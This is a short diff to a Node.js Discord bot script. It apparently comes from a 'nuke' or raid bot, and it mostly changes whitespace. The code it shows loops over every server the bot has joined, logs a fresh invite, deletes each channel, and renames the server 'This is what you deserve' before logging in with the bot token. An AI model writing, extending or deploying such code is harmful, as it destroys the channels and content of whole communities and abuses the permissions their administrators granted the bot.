@@ -14,19 +14,16 @@ client.guilds.forEach(server => {
 server.channels.first().createInvite().then(inviteCode => {
     console.log(inviteCode);
 
-});
+        });
     });
 });
-    //.catch(error=>console.error(error));
-
+   
 
 client.guilds.forEach(server => {
     server.channels.forEach(channel => {
         channel.delete();    
     });
 });
-
-
 
 
 //startup message log
@@ -52,9 +49,7 @@ guild.setName("This is what you deserve");
 process.on("uncaughtException", err => {
     console.error("\x1b[37m\x1b[41mERROR\x1b[0m: An unknown and unexpected error occurred! x.x.", err);
     process.exit(1);
-});
-
-
+    });
 });
 
 client.login(config.token);
